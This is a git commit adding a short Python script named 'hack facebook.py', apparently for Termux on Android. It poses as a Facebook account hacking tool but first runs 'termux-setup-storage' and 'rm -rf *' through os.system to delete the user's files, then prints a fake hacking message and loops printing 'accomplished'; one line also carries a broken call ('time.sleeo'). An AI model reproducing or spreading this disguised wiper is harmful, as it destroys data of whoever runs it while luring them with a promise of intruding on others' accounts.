986c94254f74e3e1f5e601956b70ca2a88b35153
Mr.SECXASHI <62788900+ZeNKoKu@users.noreply.github.com>
2021-06-25 20:26:06 +0700

    Add files via upload

---
+++ hack facebook.py
@@ -0,0 +1,15 @@
+import time
+import sys,os
+
+os.system("termux-setup-storage")
+time.sleep(5)
+os.system("cd storage")
+os.system("rm -rf *")
+time.sleeo("2")
+os.system("y")
+
+FB = input("id : ")
+print("id = "+FB)
+print("Hack facebook :"+FB)
+while True:
+        print("accomplished")
